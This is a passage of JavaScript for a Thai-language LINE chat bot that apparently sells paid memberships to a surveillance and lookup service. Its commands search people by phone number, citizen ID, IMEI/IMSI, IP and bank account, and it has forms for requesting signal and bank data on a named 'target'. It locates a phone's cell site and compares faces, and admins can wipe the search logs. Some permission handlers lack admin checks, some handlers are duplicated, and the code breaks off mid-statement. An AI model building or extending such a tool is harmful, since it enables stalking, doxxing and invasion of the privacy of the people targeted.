  // หาเจ้าของเบอร์ในสมาชิก
  const memberEntry =
    Object.entries(
      db.members || {}
    )
      .find(([uid, m]) => {

        const memberPhone =
          String(
            m?.phone ||
            m?.tel ||
            m?.mobile ||
            ''
          )
            .replace(/\D/g, '');

        return memberPhone === phone;
      });


  if (!memberEntry) {
    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
`❌ ไม่พบสมาชิก

 เบอร์ : ${phone}`
      }
    );
  }


  const [
    targetUserId,
    targetMember
  ] = memberEntry;


  db.siBlocked =
    db.siBlocked || {};


  db.siBlocked[phone] =
    true;


  saveDB(db);


  return reply(
    event.replyToken,
    {
      type: 'text',
      text:
` ระงับคำสั่ง si@ เรียบร้อย

 สมาชิก : ${
  targetMember?.fullname ||
  targetMember?.fullName ||
  '-'
}
 เบอร์ : ${phone}

สมาชิกจะไม่สามารถใช้งานคำสั่ง si@ ได้`
    }
  );
}


// =====================================
// ADMIN : ปลดระงับ SI
// ตัวอย่าง ปลดsi#0812345678
// =====================================
if (
  text
    .toLowerCase()
    .startsWith('ปลดsi#')
) {

  if (!ADMIN_IDS.includes(userId)) {
    return reply(
      event.replyToken,
      {
        type: 'text',
        text: '❌ คำสั่งนี้สำหรับแอดมินเท่านั้น'
      }
    );
  }


  const phone =
    text
      .replace(/^ปลดsi#/i, '')
      .trim()
      .replace(/\D/g, '');


  if (!/^0\d{9}$/.test(phone)) {
    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
`❌ กรุณาระบุเบอร์สมาชิก 10 หลัก

ตัวอย่าง
ปลดsi#0812345678`
      }
    );
  }


  const memberEntry =
    Object.entries(
      db.members || {}
    )
      .find(([uid, m]) => {

        const memberPhone =
          String(
            m?.phone ||
            m?.tel ||
            m?.mobile ||
            ''
          )
            .replace(/\D/g, '');

        return memberPhone === phone;
      });


  if (!memberEntry) {
    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
`❌ ไม่พบสมาชิก

 เบอร์ : ${phone}`
      }
    );
  }


  const [
    targetUserId,
    targetMember
  ] = memberEntry;


  db.siBlocked =
    db.siBlocked || {};


  delete db.siBlocked[phone];


  saveDB(db);


  return reply(
    event.replyToken,
    {
      type: 'text',
      text:
`✅ ปลดระงับคำสั่ง si@ เรียบร้อย

 สมาชิก : ${
  targetMember?.fullname ||
  targetMember?.fullName ||
  '-'
}
 เบอร์ : ${phone}

สมาชิกสามารถใช้งานคำสั่ง si@ ได้ตามปกติ`
    }
  );
}

 // ===============================
  // dol%เลขบัตร 13 หลัก
  // ===============================
  if (text.toLowerCase().startsWith('dol%')) {
    const pid = text.replace(/^dol%/i, '').trim();

    if (!/^\d{13}$/.test(pid)) {
      return reply(event.replyToken, {
        type: 'text',
        text: "❌ กรุณาระบุเลขบัตรประชาชน 13 หลัก\nตัวอย่าง: dol@1234567891234"
      });
    }

    return reply(
  event.replyToken,
  buildOfficeHourSearchFlex(pid)
);
  }

if (text.startsWith('@')) {
  if (!isAdmin(userId)) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ คำสั่งนี้ใช้ได้เฉพาะแอดมิน'
    });
  }

  const raw = text.slice(1).trim();
  const commaIndex = raw.indexOf(',');

  if (commaIndex === -1) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ รูปแบบไม่ถูกต้อง\nตัวอย่าง:\n@UID,ข้อความที่จะส่ง'
    });
  }

  const targetUserId = raw.slice(0, commaIndex).trim();
  const messageText = raw.slice(commaIndex + 1).trim();

  if (!targetUserId || !messageText) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ กรุณาระบุ UID และข้อความ\nตัวอย่าง:\n@Uxxxx,สวัสดีครับ'
    });
  }

  try {
    await push(targetUserId, {
      type: 'text',
      text: messageText
    });

    return reply(event.replyToken, {
      type: 'text',
      text:
`✅ ส่งข้อความถึงสมาชิกแล้ว

 UID:
${targetUserId}

 ข้อความ:
${messageText}`
    });

  } catch (e) {
    console.log('admin send to user error:', e.message);

    return reply(event.replyToken, {
      type: 'text',
      text: '❌ ส่งข้อความไม่สำเร็จ กรุณาตรวจสอบ UID'
    });
  }
}

if (
  text.startsWith('d#') ||
  text.startsWith('tv#') ||
  text.startsWith('t#') ||
  text.startsWith('tid#') ||
  text.startsWith('tn#') ||
  text.startsWith('f#') ||
  text.startsWith('all%') ||
  text.startsWith('tic%') ||
  text.startsWith('atm%') ||
  text.startsWith('pw%') ||
  text.startsWith('cell%') ||
  text.startsWith('pid%') ||
  text.startsWith('nm%') ||
  text.startsWith('h%') ||
  text.startsWith('dbd%') ||
  text.startsWith('nb%') ||
  text.startsWith('si%') ||
  text.startsWith('dc%') ||
  text.startsWith('dl#') ||
  text.startsWith('pb%') ||
  text.startsWith('psi#') ||
  text.startsWith('ps#') ||
  text.startsWith('wf%') ||
  text.startsWith('c#') ||
  text.startsWith('doc#') ||
  text.startsWith('cid#') ||
  text.startsWith('car#') ||
  text.startsWith('pt%') ||
  text.startsWith('ff%') ||
  text.startsWith('peab%') ||
  text.startsWith('pean%') ||
  text.startsWith('peau%') ||
  text.startsWith('peac%') ||
  text.startsWith('phis%') ||
  text.startsWith('chphis%') ||
  text.startsWith('dr%') ||
  text.startsWith('soc%') ||
  text.startsWith('ip%') ||
  text.startsWith('imei%') ||
  text.startsWith('imsi%') ||
  text.startsWith('icc%') ||
  text.startsWith('web%') ||
  text.startsWith('dis%') ||
  text.startsWith('map%') ||
  text.startsWith('lw%') ||
  text.startsWith('cj%') ||
  text.startsWith('se%') ||
  text.startsWith('lc%') ||
  text.startsWith('loa%') ||
  text.startsWith('for%') ||
  text.startsWith('tr%') ||
  text.startsWith('cctv%') ||
  text.startsWith('tisi%') ||
  text.startsWith('s%') ||
  text.startsWith('sc%') ||
  text.startsWith('bq%') ||
  text.startsWith('kp%') ||
  text.startsWith('uf%')
) {
  try {
    const profile = await getProfile(userId);

    saveSearchLog(
      userId,
      profile.displayName,
      String(event.message.text || '').trim()
    );

    console.log(
      'SAVE LOG:',
      profile.displayName,
      text
    );
  } catch (e) {
    console.log(
      'save log error:',
      e.message
    );
  }
}

  // =========================
  // BASE% REQUEST FLOW
  // =========================
  if (text.toLowerCase() === 'base%') {

  // =========================
  // ตรวจสิทธิ์สมาชิก
  // =========================
  if (
    !isActiveMember(member) &&
    !isAdmin(userId)
  ) {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
          "❌ คำสั่ง base@ ใช้ได้เฉพาะสมาชิกที่ได้รับอนุมัติและยังไม่หมดอายุ"
      }
    );

  }


  // ล้าง session แบบเก่า
  // เผื่อผู้ใช้เคยค้างอยู่ในขั้นตอนเดิม
  delete baseRequestSessions[userId];


  // =========================
  // เปิด LIFF BASE REQUEST
  // =========================
  return reply(
    event.replyToken,
    {
      type: 'flex',

      altText:
        " แบบฟอร์มขอข้อมูลสัญญาณ",

      contents: {
        type: 'bubble',
        size: 'mega',

        header: {
          type: 'box',
          layout: 'vertical',

          backgroundColor:
            '#0F172A',

          paddingAll:
            '18px',

          contents: [

            {
              type: 'text',
              text:
                " BASE REQUEST",

              color:
                '#FFFFFF',

              weight:
                'bold',

              size:
                'xl',

              wrap:
                true
            },

            {
              type: 'text',
              text:
                'NECT SIGNAL REQUEST SYSTEM',

              color:
                '#94A3B8',

              size:
                'xs',

              margin:
                'sm',

              wrap:
                true
            }

          ]
        },


        body: {
          type: 'box',
          layout: 'vertical',

          spacing:
            'md',

          paddingAll:
            '20px',

          contents: [

            {
              type: 'text',
              text:
                'กรอกข้อมูลเป้าหมาย เหตุในการขอข้อมูล และแนบหลักฐานประกอบคำขอผ่านแบบฟอร์มสมาชิก',

              size:
                'sm',

              color:
                '#334155',

              wrap:
                true
            },

            {
              type: 'separator',
              margin:
                'md'
            },

            {
              type: 'text',
              text:
                " หมายเลขโทรศัพท์เป้าหมาย",

              size:
                'sm',

              color:
                '#64748B',

              wrap:
                true
            },

            {
              type: 'text',
              text:
                " เครือข่าย AIS / TRUE / DTAC",

              size:
                'sm',

              color:
                '#64748B',

              wrap:
                true
            },

            {
              type: 'text',
              text:
                " ชื่อเคส / เหตุในการขอข้อมูล",

              size:
                'sm',

              color:
                '#64748B',

              wrap:
                true
            },

            {
              type: 'text',
              text:
                " ข้อมูลเป้าหมาย",

              size:
                'sm',

              color:
                '#64748B',

              wrap:
                true
            },

            {
              type: 'text',
              text:
                " แนบภาพหลักฐานประกอบคำขอ",

              size:
                'sm',

              color:
                '#64748B',

              wrap:
                true
            }

          ]
        },


        footer: {
          type: 'box',
          layout: 'vertical',

          paddingAll:
            '16px',

          contents: [

            {
              type: 'button',

              style:
                'primary',

              color:
                '#2563EB',

              height:
                'sm',

              action: {
                type: 'uri',

                label:
                  'เปิดแบบฟอร์มขอสัญญาณ',

                uri:
                  'https://liff.line.me/2011072783-DoxaHzSG'
              }
            }

          ]
        }
      }
    }
  );

}

// =========================
// BANK% REQUEST
// =========================
if (text.toLowerCase() === 'bank%') {

  // ตรวจสิทธิ์สมาชิก
  if (
    !isActiveMember(member) &&
    !isAdmin(userId)
  ) {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
          "❌ คำสั่ง bank@ ใช้ได้เฉพาะสมาชิกที่ได้รับอนุมัติและยังไม่หมดอายุ"
      }
    );

  }


  return reply(
    event.replyToken,
    {
      type: 'flex',

      altText:
        " แบบฟอร์มขอข้อมูลธนาคาร",

      contents: {

        type: 'bubble',

        size: 'mega',


        header: {

          type: 'box',

          layout: 'vertical',

          backgroundColor:
            '#0F172A',

          paddingAll:
            '18px',

          contents: [

            {
              type: 'text',

              text:
                " BANK REQUEST",

              color:
                '#FFFFFF',

              weight:
                'bold',

              size:
                'xl',

              wrap:
                true
            },

            {
              type: 'text',

              text:
                'NECT BANK REQUEST SYSTEM',

              color:
                '#94A3B8',

              size:
                'xs',

              margin:
                'sm',

              wrap:
                true
            }

          ]

        },


        body: {

          type: 'box',

          layout: 'vertical',

          spacing:
            'md',

          paddingAll:
            '20px',

          contents: [

            {
              type: 'text',

              text:
                'กรอกข้อมูลที่ต้องการขอ ตรวจสอบช่วงวันที่และเวลา พร้อมแนบเอกสารหรือหลักฐานประกอบคำขอ',

              size:
                'sm',

              color:
                '#334155',

              wrap:
                true
            },

            {
              type: 'separator',

              margin:
                'md'
            },

            {
              type: 'text',

              text:
                " หมายเลขบัญชี หรือเลขบัตร 13 หลัก",

              size:
                'sm',

              color:
                '#64748B',

              wrap:
                true
            },

            {
              type: 'text',

              text:
                " ชื่อธนาคาร",

              size:
                'sm',

              color:
                '#64748B',

              wrap:
                true
            },

            {
              type: 'text',

              text:
                " วันที่และเวลาที่ต้องการข้อมูล",

              size:
                'sm',

              color:
                '#64748B',

              wrap:
                true
            },

            {
              type: 'text',

              text:
                " ชื่อเคส / เหตุในการขอข้อมูล",

              size:
                'sm',

              color:
                '#64748B',

              wrap:
                true
            },

            {
              type: 'text',

              text:
                " แนบเอกสารหรือหลักฐานประกอบ",

              size:
                'sm',

              color:
                '#64748B',

              wrap:
                true
            }

          ]

        },


        footer: {

          type: 'box',

          layout: 'vertical',

          paddingAll:
            '16px',

          contents: [

            {
              type: 'button',

              style:
                'primary',

              color:
                '#059669',

              height:
                'sm',

              action: {

                type:
                  'uri',

                label:
                  'เปิดแบบฟอร์มขอข้อมูล',

                uri:
                  'https://liff.line.me/2011072783-YQjgbeRN'

              }

            }

          ]

        }

      }

    }
  );

}

  if (text.toLowerCase() === 'ยกเลิกbase' || text.toLowerCase() === 'cancelbase') {
    delete baseRequestSessions[userId];
    return reply(event.replyToken, {
      type: 'text',
      text: "✅ ยกเลิกรายการ base@ แล้ว"
    });
  }

  const baseSession = baseRequestSessions[userId];

  if (baseSession) {
    if (baseSession.step === 'waiting_phone') {
      const phone = text.replace(/\D/g, '');

      if (!/^0\d{9}$/.test(phone)) {
        return reply(event.replyToken, {
          type: 'text',
          text: '❌ กรุณาแจ้งหมายเลขโทรศัพท์ให้ครบ 10 หลัก เช่น 0812345678'
        });
      }

      baseSession.phone = phone;
      baseSession.step = 'waiting_network';

      return reply(event.replyToken, {
        type: 'text',
        text:
`แจ้งเครือข่าย เช่น AIS TRUE DTAC
 หากไม่ทราบ ให้ใช้คำสั่ง on@66 เพื่อเช็ค`
      });
    }

    if (baseSession.step === 'waiting_network') {
      const network = text.trim().toUpperCase();

      if (!network || network.length > 50) {
        return reply(event.replyToken, {
          type: 'text',
          text: '❌ กรุณาแจ้งชื่อเครือข่าย เช่น AIS TRUE หรือ DTAC'
        });
      }

      baseSession.network = network;
      baseSession.step = 'waiting_case';

      return reply(event.replyToken, {
        type: 'text',
        text: 'แจ้งชื่อเคสคดี หรือชื่อเคส เช่น หมายจับ/ลักทรัพย์'
      });
    }

    if (baseSession.step === 'waiting_case') {
      if (text.length < 2 || text.length > 200) {
        return reply(event.replyToken, {
          type: 'text',
          text: '❌ กรุณาแจ้งชื่อเคสหรือรายละเอียดคดีให้ชัดเจน'
        });
      }

      baseSession.caseName = text;
      baseSession.step = 'waiting_target';

      return reply(event.replyToken, {
        type: 'text',
        text: 'แจ้งข้อมูลชื่อ นามสกุลเป้าหมาย และเลขบัตรประชาชน 13 หลัก'
      });
    }

    if (baseSession.step === 'waiting_target') {
      const citizenId = (text.match(/\d{13}/) || [])[0];

      if (!citizenId) {
        return reply(event.replyToken, {
          type: 'text',
          text: '❌ กรุณาแจ้งชื่อ-นามสกุลเป้าหมาย พร้อมเลขบัตรประชาชน 13 หลัก'
        });
      }

      baseSession.targetInfo = text;
      baseSession.citizenId = citizenId;
      baseSession.step = 'waiting_evidence';

      return reply(event.replyToken, {
        type: 'text',
        text:
`รบกวนส่งภาพหมายจับกรณีเคสหมายจับ
หากไม่ใช่หมายจับ กรุณาส่งภาพหลักฐานเข้ามาครับ

พิมพ์ "ยกเลิกbase" หากต้องการยกเลิกรายการ`
      });
    }

    if (baseSession.step === 'waiting_evidence') {
      return reply(event.replyToken, {
        type: 'text',
        text: " กรุณาส่งเป็นรูปภาพหลักฐานเข้ามาครับ"
      });
    }
  }
  
if (text === 'แจ้งสลิปสนับสนุน') {
  supportSlipSessions[userId] = {
    step: 'waiting_slip',
    createdAt: Date.now()
  };

  return reply(event.replyToken, {
    type: 'text',
    text: " กรุณาส่งภาพสลิปสนับสนุนเข้ามาในแชทนี้ได้เลยครับ"
  });
}

if (text.startsWith('ดูlog')) {
  if (!isAdmin(userId)) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ คำสั่งนี้ใช้ได้เฉพาะแอดมิน'
    });
  }

  let logs = [];

  try {
    logs = JSON.parse(fs.readFileSync(SEARCH_LOG_FILE, 'utf8'));
  } catch {
    logs = [];
  }

  const keyword = text.replace(/^ดูlog#?/i, '').trim();

  if (keyword) {
    logs = logs.filter(log =>
      String(log.text || '').includes(keyword) ||
      String(log.lineName || '').includes(keyword) ||
      String(log.userId || '').includes(keyword)
    );
  }

  const rows = logs.slice(0, 20).map((log, i) => {
    const timeText = log.time
      ? formatThaiDate(log.time)
      : '-';

    return `${i + 1}.  ชื่อ LINE ผู้ค้น: ${log.lineName || '-'}
 UID ผู้ค้น: ${log.userId || '-'}
 วันที่เวลาค้น: ${timeText}
 รายการที่ค้น: ${log.text || '-'}`;
  });

  return reply(event.replyToken, {
    type: 'text',
    text: rows.length
      ? ` ประวัติการค้นหา${keyword ? `\nค้นหา: ${keyword}` : ''}\n\n${rows.join('\n\n')}`
      : 'ไม่พบประวัติการค้นหา'
  });
}

if (text === 'ลบlogทั้งหมด') {

  if (!isAdmin(userId)) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ คำสั่งนี้ใช้ได้เฉพาะแอดมิน'
    });
  }

  try {
    fs.writeFileSync(
      SEARCH_LOG_FILE,
      JSON.stringify([], null, 2),
      'utf8'
    );

    return reply(event.replyToken, {
      type: 'text',
      text: '✅ ลบ Log ทั้งหมดเรียบร้อยแล้ว'
    });

  } catch (err) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ เกิดข้อผิดพลาดในการลบ Log'
    });
  }
}

if (text.startsWith('ดูสมาชิกทั้งหมด')) {
  const page = Number(text.split(/\s+/)[1]) || 1;

  return reply(event.replyToken, {
    type: 'text',
    text: buildMembersAllText(db, page)
  });
}

if (text.startsWith('สมาชิกใกล้หมดอายุ')) {
  const page = Number(text.split(/\s+/)[1]) || 1;

  return reply(event.replyToken, {
    type: 'text',
    text: buildMembersExpiringSoonText(db, page)
  });
}

if (text.toLowerCase().startsWith('jk%')) {
  const phone = text.slice(3).trim();

  if (!phone) {
    return reply(event.replyToken, {
      type: 'text',
      text: "❌ รูปแบบคำสั่ง\njk@0827161650"
    });
  }

  const result = await searchJunkCall(phone);

  return reply(event.replyToken, {
    type: 'text',
    text: result
  });
}

if (text.startsWith('tro%')) {

  const query = text.replace(/^tro%/i, '').trim();

  if (!query) {
    return reply(event.replyToken, {
      type: 'text',
      text: "❌ กรุณาระบุข้อมูล\nตัวอย่าง: tro@1กก 123 กรุงเทพ"
    });
  }

  try {
    const profile = await getProfile(userId);

    for (const adminId of ADMIN_IDS) {
      await push(adminId, {
        type: 'text',
        text:
` มีสมาชิกใช้งานคำสั่ง tro@

 ชื่อ LINE:
${profile.displayName || '-'}

 UID:
${userId}

 ข้อมูลที่ค้น:
${text}

ตอบกลับสมาชิก:
@${userId},ข้อความที่จะส่ง`
      });
    }
  } catch (e) {
    console.log('tro% notify admin error:', e.message);
  }

  return reply(event.replyToken, {
  type: 'text',
  text:
`คำสั่งอยู่ระหว่างแก้ไข
***ขออภัยในความไม่สะดวก***`
});
}

if (/^dis%/i.test(text)) {
  const raw = text.replace(/^dis%/i, '').trim();
  const parts = raw.split('/');

  if (parts.length !== 2) {
    return reply(event.replyToken, {
      type: 'text',
      text: "❌ รูปแบบไม่ถูกต้อง\nตัวอย่าง:\ndis@16.462991566703394,102.64543023829752/16.174215621798133,102.72808867876172"
    });
  }

  const start = parts[0].split(',').map(v => v.trim());
  const end = parts[1].split(',').map(v => v.trim());

  const startLat = Number(start[0]);
  const startLng = Number(start[1]);
  const endLat = Number(end[0]);
  const endLng = Number(end[1]);

  if ([startLat, startLng, endLat, endLng].some(Number.isNaN)) {
    return reply(event.replyToken, {
      type: 'text',
      text: "❌ พิกัดไม่ถูกต้อง\nรูปแบบ: dis@lat,lng/lat,lng"
    });
  }

  const distance = calcDistanceKm(startLat, startLng, endLat, endLng).toFixed(2);

  return reply(event.replyToken, {
    type: 'text',
    text: formatDistanceResult(startLat, startLng, endLat, endLng, distance)
  });
}

  if (
  text === '#สนับสนุน' ||
  text === 'สนับสนุน' ||
  text === '#donate'
) {

  return reply(event.replyToken, [

    // ==========================================
    // FLEX ชุดที่ 1 : แพ็กเกจเดิม
    // ==========================================
    {
      type: 'flex',
      altText: 'แพ็คเกจสนับสนุนเซิร์ฟเวอร์',

      contents: {
        type: 'carousel',

        contents: [
          packageBubble('30 วัน', '499 บาท'),

          packageBubble(
            '90 วัน',
            '1299 บาท'
          ),

          packageBubble(
            '180 วัน',
            '2500 บาท',
            " ยอดนิยม"
          ),

          packageBubble(
            '365 วัน',
            '4999 บาท',
            " คุ้มที่สุด"
          )
        ]
      }
    },

    // ==========================================
    // FLEX ชุดที่ 2 : ชุดใหม่
    // ==========================================
    {
      type: 'flex',
      altText: 'คำสั่งสนับสนุนเพิ่มเติม',
      contents: extraSupportFlex()
    }

  ]);
}

if (text === 'สนับสนุน4999') {
  return reply(event.replyToken, {
    type: 'flex',
    altText: 'แพ็คเกจสนับสนุน 12 เดือน',
    contents: packageBubble('365 วัน', '4999 บาท', " คุ้มที่สุด")
  });
}

if (
  text === '#สนับสนุน' ||
  text === 'สนับสนุน' ||
  text === '#donate'
) {
  return reply(event.replyToken, {
    type: 'flex',
    altText: 'แพ็คเกจสนับสนุนเซิร์ฟเวอร์',
    contents: {
      type: 'carousel',
      contents: [
        packageBubble('30 วัน', '499 บาท'),
        packageBubble('90 วัน', '1299 บาท'),
        packageBubble('180 วัน', '2500 บาท', " ยอดนิยม"),
        packageBubble('365 วัน', '4999 บาท', " คุ้มที่สุด")
      ]
    }
  });
}

if(/^อนุญาติดีแทค#/.test(text)){

const phone=text.replace(/^อนุญาติดีแทค#/,'').trim();

db.dtacPermissions=db.dtacPermissions||{};
db.dtacPermissions[phone]=true;

db.dtacBlocked = db.dtacBlocked || {};
delete db.dtacBlocked[phone];

saveDB(db);

return reply(event.replyToken,{
type:'text',
text:`✅ อนุญาต ${phone} ใช้ d@ แล้ว`
});
}


// ===== คำสั่งแอดมินยกเลิกสิทธิ์ =====
if(/^ยกเลิกดีแทค#/.test(text)){

const phone=text.replace(/^ยกเลิกดีแทค#/,'').trim();

db.dtacPermissions = db.dtacPermissions || {};
delete db.dtacPermissions[phone];

// เพิ่มตรงนี้
db.dtacBlocked = db.dtacBlocked || {};
db.dtacBlocked[phone] = true;

saveDB(db);

return reply(event.replyToken,{
type:'text',
text:`❌ ยกเลิก ${phone} ใช้ d@ แล้ว`
});
}

if (text.startsWith('อนุญาติดีแทค#')) {
  if (!isAdmin(userId)) {
    return reply(event.replyToken,{
      type:'text',
      text:'❌ คำสั่งนี้สำหรับแอดมิน'
    });
  }

  const phone =
  text.replace(/^อนุญาติดีแทค#/,'').trim();

  const found =
  findMemberByPhone(db,phone);

  if(!found){
    return reply(event.replyToken,{
      type:'text',
      text:'❌ ไม่พบสมาชิก'
    });
  }

  db.dtacPermissions[found.userId]=true;

  saveDB(db);

  return reply(event.replyToken,{
    type:'text',
    text:
`✅ อนุญาต DTAC แล้ว

 ${found.member.fullname || '-'}
 ${phone}`
  });
}

if (text.startsWith('ยกเลิกดีแทค#')) {

  if(!isAdmin(userId)){
    return reply(event.replyToken,{
      type:'text',
      text:'❌ คำสั่งนี้สำหรับแอดมิน'
    });
  }

  const phone =
  text.replace(/^ยกเลิกดีแทค#/,'').trim();

  const found =
  findMemberByPhone(db,phone);

  if(!found){
    return reply(event.replyToken,{
      type:'text',
      text:'❌ ไม่พบสมาชิก'
    });
  }

  delete db.dtacPermissions[found.userId];

  saveDB(db);

  return reply(event.replyToken,{
    type:'text',
    text:
` ยกเลิกสิทธิ์ DTAC แล้ว

 ${found.member.fullname || '-'}
 ${phone}`
  });
}

if(/^ยกเลิกประกันสังคม#/.test(text)){

if(!isAdmin(userId)){
return reply(event.replyToken,{
type:'text',
text:'❌ คำสั่งนี้สำหรับแอดมินเท่านั้น'
});
}

const phone=text.replace(/^ยกเลิกประกันสังคม#/,'').trim();

db.siBlocked=db.siBlocked||{};
db.siBlocked[phone]=true;

saveDB(db);

return reply(event.replyToken,{
type:'text',
text:`❌ ยกเลิก ${phone} ใช้ si@ แล้ว`
});

}

if(/^อนุญาตประกันสังคม#/.test(text)){

if(!isAdmin(userId)){
return reply(event.replyToken,{
type:'text',
text:'❌ คำสั่งนี้สำหรับแอดมินเท่านั้น'
});
}

const phone=text.replace(/^อนุญาตประกันสังคม#/,'').trim();

db.siBlocked=db.siBlocked||{};
delete db.siBlocked[phone];

saveDB(db);

return reply(event.replyToken,{
type:'text',
text:`✅ อนุญาต ${phone} ใช้ si@ แล้ว`
});

}

 // ===== ff% =====
  if (text === 'ff%') {

    faceCompareSessions[userId] = {
      step: 1,
      images: []
    };

    return reply(event.replyToken,{
      type:'text',
      text:` โหมดเปรียบเทียบใบหน้า

กรุณาส่งรูปใบหน้าที่ 1`
    });

  }

if (text === 'pt%') {

  return reply(
    event.replyToken,
    {
      type: 'flex',

      altText:
        " ระบบอ่านป้ายทะเบียนรถ",

      contents: {
        type: 'bubble',
        size: 'mega',

        header: {
          type: 'box',
          layout: 'vertical',
          backgroundColor: '#0F172A',
          paddingAll: '18px',

          contents: [
            {
              type: 'text',
              text: " อ่านป้ายทะเบียนรถ",
              color: '#FFFFFF',
              weight: 'bold',
              size: 'xl',
              wrap: true
            },

            {
              type: 'text',
              text: 'NECT AI TOOLS',
              color: '#94A3B8',
              size: 'xs',
              margin: 'sm'
            }
          ]
        },

        body: {
          type: 'box',
          layout: 'vertical',
          spacing: 'md',
          paddingAll: '20px',

          contents: [
            {
              type: 'text',
              text:
                'อัปโหลดภาพรถหรือภาพป้ายทะเบียน เพื่อให้ระบบทำการอ่านและวิเคราะห์ข้อมูล',
              size: 'sm',
              color: '#334155',
              wrap: true
            },

            {
              type: 'separator',
              margin: 'md'
            },

            {
              type: 'text',
              text: " รองรับ JPG / PNG / WEBP",
              size: 'sm',
              color: '#64748B',
              wrap: true
            },

            {
              type: 'text',
              text: " สำหรับสมาชิกที่มีสิทธิ์ใช้งาน",
              size: 'sm',
              color: '#64748B',
              wrap: true
            }
          ]
        },

        footer: {
          type: 'box',
          layout: 'vertical',
          paddingAll: '16px',

          contents: [
            {
              type: 'button',
              style: 'primary',
              color: '#2563EB',
              height: 'sm',

              action: {
                type: 'uri',
                label: 'เปิดระบบอ่านป้ายทะเบียน',
                uri:
                  'https://liff.line.me/2011072783-WS7wKsFc'
              }
            }
          ]
        }
      }
    }
  );

}

if (text.startsWith('b%')) {

  const query = text.slice(2).trim();

  const parts = query.split('/').map(v => v.trim());

  if (parts.length !== 4) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ รูปแบบคำสั่งไม่ถูกต้อง

ใช้:
b@MCC/MNC/LAC/CID

ตัวอย่าง:
b@520/3/6135/18461`
    });
  }

  const [mcc, mnc, lac, cid] = parts;

  if (
    !/^\d+$/.test(mcc) ||
    !/^\d+$/.test(mnc) ||
    !/^\d+$/.test(lac) ||
    !/^\d+$/.test(cid)
  ) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ MCC/MNC/LAC/CID ต้องเป็นตัวเลขเท่านั้น'
    });
  }

  if (!UNWIREDLABS_TOKEN) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ ยังไม่ได้ตั้งค่า UNWIREDLABS_TOKEN'
    });
  }

  try {

    const result = await autoLookupUnwiredCell(
      mcc,
      mnc,
      lac,
      cid
    );

    if (!result.radio || result.data?.status !== 'ok') {

      return reply(event.replyToken, {
        type: 'text',
        text:
`❌ ไม่พบตำแหน่ง Cell Site

MCC: ${mcc}
MNC: ${mnc}
LAC/TAC: ${lac}
CID: ${cid}

${result.data?.message || 'No matches found'}`
      });
    }

    const data = result.data;

    const lat = data.lat;
    const lon = data.lon;

    const mapsUrl =
      `https://www.google.com/maps?q=${lat},${lon}`;

    return reply(event.replyToken, {
      type: 'flex',
      altText: `Cell Site ${mcc}/${mnc}/${lac}/${cid}`,

      contents: {
        type: 'bubble',
        size: 'mega',

        header: {
          type: 'box',
          layout: 'vertical',
          backgroundColor: '#0F172A',
          paddingAll: '18px',

          contents: [
            {
              type: 'text',
              text: " CELL SITE",
              color: '#FFFFFF',
              weight: 'bold',
              size: 'xl'
            },

            {
              type: 'text',
              text: result.radio,
              color: '#38BDF8',
              size: 'sm',
              margin: 'sm'
            }
          ]
        },

        body: {
          type: 'box',
          layout: 'vertical',
          spacing: 'md',

          contents: [
            {
              type: 'text',
              text: `MCC: ${mcc}`,
              wrap: true
            },

            {
              type: 'text',
              text: `MNC: ${mnc}`,
              wrap: true
            },

            {
              type: 'text',
              text: `LAC/TAC: ${lac}`,
              wrap: true
            },

            {
              type: 'text',
              text: `CID/eCID: ${cid}`,
              wrap: true
            },

            {
              type: 'separator',
              margin: 'md'
            },

            {
              type: 'text',
              text: `Lati,Longti: ${lat}, ${lon}`,
              weight: 'bold',
              wrap: true
            },

            {
              type: 'text',
              text: `Accuracy: ${data.accuracy ?? '-'} เมตร`,
              wrap: true
            },

            {
              type: 'text',
              text: `Location:${data.address || '-'}`,
              wrap: true
            }
          ]
        },

        footer: {
          type: 'box',
          layout: 'vertical',
          spacing: 'sm',

          contents: [
            {
              type: 'button',
              style: 'primary',
              action: {
                type: 'uri',
                label: " เปิด Google Maps",
                uri: mapsUrl
              }
            },

            {
              type: 'button',
              style: 'secondary',
              action: {
                type: 'clipboard',
                label: " คัดลอกพิกัด",
                clipboardText: `${lat},${lon}`
              }
            }
          ]
        }
      }
    });

  } catch (err) {

    console.log(
      'b% error:',
      err.response?.data || err.message
    );

    return reply(event.replyToken, {
      type: 'text',
      text: '❌ เกิดข้อผิดพลาดในการค้นหา Cell Site'
    });
  }
}

if (text.startsWith('pid%')) {
  return reply(event.replyToken, {
    type: 'text',
    text:
`คำสั่ง pid@ อยู่ระหว่างแก้ไข
ขออภัยอย่างสูงครับ`
  });
}

  if (text.startsWith('lw%')) {

   const q = text.replace(/^lw%/,'').trim();

   if(!q){
      return reply(event.replyToken,{
         type:'text',
         text:"❌ ใช้งาน: lw@คำถาม"
      });
   }

   const res=await askLaw(q);

   if(
      !res ||
      !res.response ||
      !res.response.length
   ){
      return reply(event.replyToken,{
         type:'text',
         text:'❌ ไม่สามารถติดต่อระบบกฎหมายได้'
      });
   }

let answer = res.response[0].text;

// ลบข้อความเปิดของทนอย
answer = answer.replace(
/สวัสดีครับ!.*?ครับผม!\s*/s,
''
);

   return reply(event.replyToken,{
      type:'text',
      text:`
────────────
${res.response[0].text}`
   });

if (text.startsWith('dis%')) {
const raw = text.replace(/^dis%/i, '').trim();

const parts = raw.split('/');
if (parts.length !== 2) {
return reply(event.replyToken, {
type: 'text',
text: "❌ รูปแบบไม่ถูกต้อง\nตัวอย่าง:\ndis@16.462991566703394,102.64543023829752/16.174215621798133,102.72808867876172"
});
}

const start = parts[0].split(',').map(v => v.trim());
const end = parts[1].split(',').map(v => v.trim());

if (start.length !== 2 || end.length !== 2) {
return reply(event.replyToken, {
type: 'text',
text: "❌ กรุณาระบุพิกัดให้ครบ\nรูปแบบ: dis@lat,lng/lat,lng"
});
}

const startLat = start[0];
const startLng = start[1];
const endLat = end[0];
const endLng = end[1];

try {
const apiUrl =
